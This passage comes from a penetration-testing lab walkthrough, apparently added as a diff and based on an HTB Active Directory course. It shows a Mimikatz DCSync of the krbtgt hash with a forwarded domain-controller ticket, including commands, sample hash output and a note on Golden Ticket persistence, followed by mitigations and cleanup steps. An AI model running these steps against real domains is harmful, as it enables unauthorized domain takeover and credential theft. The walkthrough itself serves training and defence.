+**Common mistake:** using the user's base64 certificate instead of the DC machine account's. The `UserName` line must show the machine account.
+
+**Next:** Step 23.
+
+### Step 23 — Alternative: Windows path — DCSync krbtgt with Mimikatz
+
+**Priority:** Advanced · **Run on:** Windows · **Status:** Documented
+
+```powershell
+klist
+```
+
+**Purpose:** confirm three tickets are cached — the forwarded and primary `krbtgt` tickets plus a CIFS ticket.
+
+```output
+Cached Tickets: (3)
+
+#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
+        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        Cache Flags: 0x2 -> DELEGATION
+
+#1>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
+        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+        Cache Flags: 0x1 -> PRIMARY
+```
+
+```powershell
+cd .\mimikatz\x64\
+.\mimikatz.exe
+```
+
+```powershell
+lsadump::dcsync /user:<DOMAIN_PART1>\krbtgt
+```
+
+**Purpose:** DCs hold replication rights, so the imported ticket is enough to DCSync. The `krbtgt` hash is Golden Ticket material for persistence.
+
+**Look for:** `Hash NTLM` under `Credentials:`.
+
+```output
+mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+SAM Username         : krbtgt
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
+    lm  - 0: 4562458c201a97fa19365ce901513c21
+```
+
+**Success path:** the `krbtgt` NTLM hash → domain compromise; persistence via Golden Ticket is now possible.
+
+**Common mistake:** running this without the imported ticket — Mimikatz then performs the DCSync in your own context and will be denied.
+
+**Next:** stop attacking and document.
+
+## 5. Mitigations
+
+- Patch CVE-2021-36942 on every affected host.
+- Enable Extended Protection for Authentication **and** Require SSL, so Certificate Authority Web Enrollment and Certificate Enrollment Web Service only accept HTTPS.
+- Disable NTLM authentication on Domain Controllers.
+- Disable NTLM on AD CS servers via Group Policy.
+- Disable NTLM for IIS on AD CS servers running Web Enrollment and Certificate Enrollment Web Service.
+
+> Patching alone is not sufficient. The *Certified Pre-Owned* whitepaper shows that a standard domain user can still attack AD CS through its authenticated APIs, so EPA, NTLM hardening and template permissions have to be reviewed as well.
+
+## 6. Cleanup and reporting
+
+- Delete the ccache files created by noPac and gettgtpkinit; they are live credentials.
+- Remove the computer account noPac created if the delete failed during the run.
+- Stop the SMB share and the handler when PrintNightmare is finished.
+- Note the certificate issued by the CA and any template weakness you exploited; those are findings, not just steps.
+- Record what you changed on the target so the client can revert it.
+
+## 7. Verification note
+
+Commands, flags and argument order are reproduced from the HTB *Active Directory Enumeration & Attacks* section “Bleeding Edge Vulnerabilities”. Target-specific values (IP addresses, domain, credentials, hashes, certificate bodies) were replaced with this site's variables; the source's literal values remain visible in the output excerpts. Outputs are labelled **source excerpt** and were not produced on this machine. `impacket-smbserver`, `impacket-ntlmrelayx` and `impacket-rpcdump` exist here and the `secretsdump`/`rpcdump` flag spellings were checked, but no domain was attacked, no payload was executed and no ticket was requested for this page.
